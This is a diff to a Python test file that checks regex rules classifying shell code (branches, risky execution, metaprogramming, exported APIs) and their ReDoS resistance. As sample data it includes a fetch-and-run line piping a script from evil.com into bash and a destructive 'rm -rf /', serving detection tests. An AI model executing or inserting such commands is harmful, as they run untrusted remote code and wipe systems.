@@ -59,8 +59,9 @@ _SHELL_SIMPLE_CASES = [
     # (signature, positive snippet, text expected to NOT match / None to skip)
     # --- PHASE 1 ---
     ("branch", "if [[ $x -gt 5 ]]; then", "x=5"),
-    ("branch", "[ \"$x\" = \"y\" ]", "arr[0]=1"),
-    ("branch", "  [ -z x ]", "echo '[]'"),
+    # 2822 corollary 2: test brackets are the conditional's syntax, boundaries owns them
+    ("branch", "elif [ -z x ]; then", '[ "$x" = "y" ]'),
+    ("branch", "until [ -z x ]; do", "  [ -z x ]"),
     ("branch", "if true; [ -z x ]; then", "echo '[text]'"),
     ("branch", "for i in {1..5}; do", "for_loop=1"),
     ("branch", "while read -r line; do", "while_loop=1"),
@@ -88,7 +89,11 @@ _SHELL_SIMPLE_CASES = [
         "curl https://evil.com/install.sh | bash",
         "curl https://example.com/data.json -o data.json",
     ),
-    ("high_risk_execution", "rm -rf /tmp/build", "rm file.txt"),
+    (
+        "high_risk_execution",
+        "rm -rf /",
+        "rm -rf /tmp/build",
+    ),  # #2878 C4: root only; a path is cleanup's question (#2843)
     ("io", "curl -O https://example.com/file", "echo done"),
     ("api", "export MY_VAR=1", "local MY_VAR=1"),
     ("state_mutation", "x=5", "echo x"),
@@ -102,7 +107,7 @@ _SHELL_SIMPLE_CASES = [
     ("globals", "echo $HOME", "echo $myvar"),
     ("comprehensions", "for i in {1..10}; do", "for i in 1 2 3; do"),
     ("scientific", "result=$(( 1 + 2 ))", "result=1"),
-    ("reflection_metaprogramming", "output=$(date)", "output=static"),
+    ("reflection_metaprogramming", 'eval "$cmd"', "output=$(date)"),
     ("import", "source ./lib.sh", "echo lib.sh"),
     ("ownership", "# Author: Jane Doe", "# just a note"),
     # --- PHASE 4 ---
@@ -122,7 +127,7 @@ _SHELL_SIMPLE_CASES = [
     ("sync_locks", "flock /tmp/lock", "echo lock"),
     ("immutability_locks", "readonly CONST=1", "local CONST=1"),
     ("cleanup", "rm -f /tmp/file", "ls /tmp/file"),
-    ("encapsulation", "local x=1", "export x=1"),
+    # encapsulation is None since #2766 -- `local` is lexical scope, not API visibility.
     ("listeners", "nc -l 8080", "nc example.com 80"),
     ("test_skip", "# SKIP: flaky test", "# run test"),
     # --- HYBRID ---
@@ -188,8 +193,9 @@ def test_shell_lexical_family_no_block_terminator_state_to_confuse():
     payload -- there is nothing for a stray `}`/`fi` to falsely "close".
     The one place shell rules DO track a nesting depth is delimiter
     matching for `$(...)`, `<(...)`/`>(...)`, and `${...}` (safety,
-    concurrency, reflection_metaprogramming) -- covered by the dedicated
-    nested-delimiter regression tests below, not by comment-state tracking.
+    concurrency) -- covered by the dedicated nested-delimiter regression
+    tests below, not by comment-state tracking. (reflection_metaprogramming
+    used to be in that list; #2722 dropped command substitution from it.)
     """
     branch = SHELL_RULES["branch"]
     heredoc_body_with_fi = "cat <<EOF\nif true; then\n  echo hi\nfi\nEOF\n"
@@ -221,14 +227,20 @@ def test_shell_structural_boundaries_dot_source_leading_boundary_regression():
 
 def test_shell_safety_nested_default_expansion_regression():
     """
-    Nested-delimiter regression (Rule 11): both `${...}` clauses in `safety`
-    (the quoted and unquoted default-value forms) used a flat `[^}]+`/
-    `[^}]*` delimiter matcher, which cannot represent one level of nesting.
-    A realistic nested default-value expansion -- e.g.
+    Nested-delimiter regression (Rule 11): the `${...}` default-value clause
+    in `safety` used a flat `[^}]*` delimiter matcher, which cannot represent
+    one level of nesting. A realistic nested default-value expansion -- e.g.
     `${LOG_LEVEL:-${DEFAULT_LEVEL:-info}}`, a common multi-level fallback
     idiom -- truncated at the first (inner) `}` instead of capturing the
     full expression. Upgraded to the one-level-nesting form from the
     project's Rule 11 playbook.
+
+    #2869 contract: C4, the dedicated quoted-string alternative (`"${...}"`)
+    was dropped from `safety` -- quoted expansion is ordinary shell, not a
+    defensive form. The bare `${VAR:-default}` fallback clause still fires
+    inside a quoted string (it doesn't require an unquoted context), so the
+    nested match is still found there -- it just no longer captures the
+    enclosing quote characters themselves.
     """
     pattern = SHELL_RULES["safety"]
     m = pattern.search("${LOG_LEVEL:-${DEFAULT_LEVEL:-info}}")
@@ -236,8 +248,8 @@ def test_shell_safety_nested_default_expansion_regression():
         f"nested default expansion truncated: {m.group() if m else None!r}"
     )
     m2 = pattern.search('"${LOG_LEVEL:-${DEFAULT_LEVEL:-info}}"')
-    assert m2 and m2.group() == '"${LOG_LEVEL:-${DEFAULT_LEVEL:-info}}"', (
-        f"nested quoted default expansion truncated: {m2.group() if m2 else None!r}"
+    assert m2 and m2.group() == "${LOG_LEVEL:-${DEFAULT_LEVEL:-info}}", (
+        f"nested default expansion (inside quotes) truncated: {m2.group() if m2 else None!r}"
     )
     assert pattern.search("${VAR:-default}"), "non-nested form regressed"
 
@@ -306,35 +318,76 @@ def test_shell_concurrency_process_substitution_redos_immunity():
     assert pattern.search("diff <(sort a) <(sort b)")
 
 
-def test_shell_reflection_metaprogramming_nested_command_substitution_regression():
+def test_shell_reflection_metaprogramming_is_dispatch_not_vocabulary():
     """
-    Nested-delimiter regression (Rule 11): `$(...)` (command substitution)
-    used a flat `[^)]+` delimiter matcher, which cannot represent one level
-    of nesting. A realistic nested command substitution -- e.g.
-    `DIR=$(cd "$(dirname "$0")" && pwd)`, the canonical "find my own script
-    directory" idiom -- truncated at the first (inner) `)` instead of
-    capturing the full outer substitution. Upgraded to the one-level-nesting
-    form.
+    Vocabulary-leak regression (#2722). The rule counted two pieces of
+    ordinary shell as metaprogramming:
+
+    * `\\$\\{!?[a-zA-Z0-9_]+\\}` made the indirection marker OPTIONAL, so plain
+      `${var}` matched. On the crucible that was 4,117 of 4,863 shell hits
+      (85%) -- while `${!var}`, the construct the alternative exists for,
+      never occurs in the corpus at all.
+    * `$(...)` and backticks counted every command substitution, one hit per
+      ~33 lines of real shell. Running a program yields data, not code, and
+      no other language's rule counts invocation (python's does not fire on
+      `subprocess.run`).
+
+    Since #2719 this count IS the file's dynamism, feeding documentation risk
+    and cognitive load, so the leak was structural. What remains is dispatch
+    decided at runtime by a name: `eval`, indirect expansion, namerefs,
+    `source`/`.` of a computed path, and inline sub-language programs.
+
+    A nested-delimiter regression used to live here: `$(...)` had a flat
+    `[^)]+` matcher that truncated `DIR=$(cd "$(dirname "$0")" && pwd)` at
+    the inner `)`. That alternative is gone, so the idiom is now asserted as
+    a NEGATIVE. `safety` and `concurrency` keep their own nesting-aware
+    delimiter matchers and their own regressions.
     """
     pattern = SHELL_RULES["reflection_metaprogramming"]
-    m = pattern.search('DIR=$(cd "$(dirname "$0")" && pwd)')
-    assert m and m.group() == '$(cd "$(dirname "$0")" && pwd)', (
-        f"nested command substitution truncated: {m.group() if m else None!r}"
-    )
-    assert pattern.search("echo $(date)"), "non-nested form regressed"
+    for src in (
+        'eval "$cmd"',
+        "eval :",
+        "echo ${!name}",
+        "declare -n ref=x",
+        "local -n out=$1",
+        'source "$dir/lib.sh"',
+        ". $HOME/.env",
+        "awk '{print $1}' file",
+    ):
+        assert pattern.search(src), f"runtime dispatch not counted: {src!r}"
+    for src in (
+        "echo ${var}",
+        'echo "${HOME}/bin"',
+        "output=$(date)",
+        'DIR=$(cd "$(dirname "$0")" && pwd)',
+        "files=`ls`",
+        "medieval=1",
+        "source ./lib.sh",
+    ):
+        m = pattern.search(src)
+        assert not m, f"shell vocabulary counted as dynamism: {src!r} -> {m.group()!r}"
 
 
-def test_shell_reflection_metaprogramming_command_substitution_redos_immunity():
+def test_shell_reflection_metaprogramming_redos_immunity():
     """
-    Regression test for a confirmed real O(n^2) ReDoS: `$(...)`'s flat
-    `[^)]+` was unbounded and unanchored -- quadratic on a long run of
-    unclosed `$(` (confirmed ~4x per doubling at n=2k/4k/8k/16k/32k, e.g.
-    0.006s/0.024s/0.094s/0.38s/1.5s) before being upgraded to the
-    one-level-nesting form, which is linear (~2x per doubling).
+    ReDoS coverage for the rule's surviving alternatives (#2722).
+
+    The historical bug was `$(...)`'s flat `[^)]+`: unbounded and unanchored,
+    quadratic on a long run of unclosed `$(` (confirmed ~4x per doubling at
+    n=2k/4k/8k/16k/32k, e.g. 0.006s/0.024s/0.094s/0.38s/1.5s). That
+    alternative no longer exists, so the input that provoked it is now
+    asserted to be immune *and* unmatched, and the check moves to the
+    alternatives that are still here: the unclosed indirect expansion
+    `${!`, the computed `source $`, and the inline sub-language program,
+    whose string run is bounded at {0,500}.
     """
     pattern = SHELL_RULES["reflection_metaprogramming"]
+    assert_redos_immune(pattern, "${!" * 20000, timeout_sec=3.0)
+    assert_redos_immune(pattern, "source $" * 20000, timeout_sec=3.0)
+    assert_redos_immune(pattern, "awk '" + "a" * 100000, timeout_sec=3.0)
     assert_redos_immune(pattern, "$(" * 20000, timeout_sec=3.0)
-    assert pattern.search("echo $(date)")
+    assert pattern.search("echo ${!ref}")
+    assert not pattern.search("echo $(date)")
 
 
 def test_shell_spec_exposure_redos_immunity():
@@ -487,7 +540,9 @@ def test_shell_ambiguity_sweep_shared_literals_are_not_bugs():
 
     local_decl = "local env=$1"
     assert structural_boundaries.search(local_decl)
-    assert encapsulation.search(local_decl)
+    # #2766 retired the encapsulation half of the `local` dual: lexical scoping is
+    # not API visibility, and shell's encapsulation is a contract-level absence.
+    assert encapsulation is None
 
     readonly_decl = "readonly VERSION=1.2.3"
     assert structural_boundaries.search(readonly_decl)
@@ -504,3 +559,30 @@ def test_shell_ambiguity_sweep_shared_literals_are_not_bugs():
     kill_call = "kill -HUP $pid"
     assert high_risk_execution.search(kill_call)
     assert panics_and_aborts.search(kill_call)
+
+
+def test_shell_api_contract_2730():
+    """
+    #2730: the api rule's stated contract is *a declaration that makes a
+    named function or type visible outside this file* (see
+    docs/api_rule_contract.md). Two failure directions are in scope: a
+    declaration the rule cannot see, and a token the rule counts where no
+    declaration exists.
+
+    `export -f name` -- the way a shell publishes a FUNCTION -- could never
+    match, so the rule only ever saw exported variables.
+
+    Every case below was verified against the real compiled rule before
+    being written down (AGENTS.md rule 3).
+    """
+    api = SHELL_RULES["api"]
+
+    # Declarations that publish a name -- must match.
+    assert api.search("export -f probe_globals"), "exported function"
+    assert api.search("export PROBE_GLOBALS=1"), "exported variable (kept)"
+
+    # Not declarations -- must not match.
+    assert not api.search("exported=1"), "identifier starting with export"
+
+    # ReDoS detonation on an unterminated flag run.
+    assert_redos_immune(api, "export " + "-f " * 40000, timeout_sec=3.0)
